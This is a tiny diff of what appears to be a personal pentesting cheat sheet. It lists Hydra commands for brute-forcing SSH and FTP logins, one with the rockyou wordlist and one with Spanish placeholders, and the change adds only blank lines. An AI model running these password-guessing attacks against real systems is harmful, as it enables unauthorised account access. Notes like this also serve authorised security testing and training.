@@ -2,3 +2,5 @@ ssh bruteforcing:
 hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://ip:port -t 4
 ftp bruteforcing:
 hydra -l <nombre_de_usuario> -P <ruta_al_diccionario> <dirección_IP> ftp
+
+
